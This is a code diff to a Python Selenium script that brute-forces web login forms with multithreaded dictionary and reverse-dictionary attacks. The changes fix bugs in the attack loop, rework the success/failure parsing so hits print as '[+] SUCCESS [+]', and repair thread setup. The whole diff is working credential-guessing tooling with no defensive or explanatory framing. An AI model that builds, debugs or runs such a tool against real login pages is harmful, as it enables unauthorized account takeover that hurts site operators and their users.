@@ -55,10 +55,10 @@ class TargetObj:
 	def submit(self):
 		button_xpath = XPATH_CONTAINS.format('button'
                                              , '.'
-											 , TargetObj.button_text)
+                                             , TargetObj.button_text)
 		input_xpath = XPATH_CONTAINS.format('input'
 		                                    , '.'
-											, TargetObj.button_text)
+                                                    , TargetObj.button_text)
 		try:
 			button = self.__driver.find_element_by_xpath(button_xpath)
 			button.click()
@@ -75,15 +75,12 @@ class TargetObj:
 		time.sleep(1)
 
 
-	### FIX THIS METHOD !!! ###
 	def parse_response(self):
-		# looking for html element with failure sign #
-		xpath = XPATH_CONTAINS.format('div', 'text()', self.failure_sign)
-		try:
-			elem = self.__driver.find_element_by_xpath(xpath)
-			return False
-		except NoSuchElementException:
-			return True
+		body = self.__driver.find_element_by_tag_name("body")
+		if self.failure_sign in body.text:
+			return "FAIL"
+		else:
+			return "[+] SUCCESS [+]"
 
 	def exit_driver(self):
 		self.__driver.quit()
@@ -116,11 +113,12 @@ def dict_attack(target_obj, queue, password_list):
 
 
 def reverse_dict_attack(target_obj, login_list, queue):
-	password = queue.get()
-	for login in login_list:
-		result = login_attempt(target_obj, login, password)
-		with print_lock:
-				print(LOGIN_ATTEMPT.format(login, passwd, result))
+	while True:
+		password = queue.get()
+		for login in login_list:
+			result = login_attempt(target_obj, login, password)
+			with print_lock:
+				print(LOGIN_ATTEMPT.format(login, password, result))
 		queue.task_done()
 
 
@@ -143,7 +141,7 @@ def brute_force(logins, passwords, num_threads, reverse = False):
 			q.put(login)
 	else:
 		for thread_counter in range(num_threads):
-			obj_per_thread = TargetObj(target_info)
+			obj_per_thread = TargetObj()
 			target_objs.append(obj_per_thread)
 			thrd = threading.Thread(target = reverse_dict_attack
                                     , args = (obj_per_thread, logins, q))
